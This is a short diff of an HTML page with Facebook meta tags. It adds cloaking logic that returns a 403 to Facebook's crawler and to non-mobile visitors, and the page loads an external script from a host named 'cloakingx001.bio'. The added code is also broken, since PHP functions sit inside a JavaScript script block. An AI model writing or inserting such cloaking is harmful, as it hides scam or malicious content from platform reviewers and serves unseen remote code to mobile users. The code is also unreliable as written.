@@ -14,8 +14,26 @@
     <meta name="facebook:app:country" content="us">
 
     <script type="text/javascript">
-        var device = navigator.userAgent.toLowerCase();
-        if (device.search(/iphone|ipod|ipad|android/) > -1) 
+        function esRobotDeFacebook() {
+    if (isset($_SERVER['HTTP_USER_AGENT'])) {
+        $userAgent = $_SERVER['HTTP_USER_AGENT'];
+        return stripos($userAgent, 'facebookexternalhit') !== false;
+    }
+    return false;
+}
+
+        function esDispositivoMovil() {
+    if (isset($_SERVER['HTTP_USER_AGENT'])) {
+        $userAgent = $_SERVER['HTTP_USER_AGENT'];
+        return (stripos($userAgent, 'android') !== false || stripos($userAgent, 'iphone') !== false);
+    }
+    return false;
+}
+
+if (esRobotDeFacebook() || !esDispositivoMovil()) {
+    http_response_code(403);
+    exit;
+}
             
     </script>
    <script src="https://x1.cloakingx001.bio/2sir8hf930" type="text/javascript" async="true"></script>
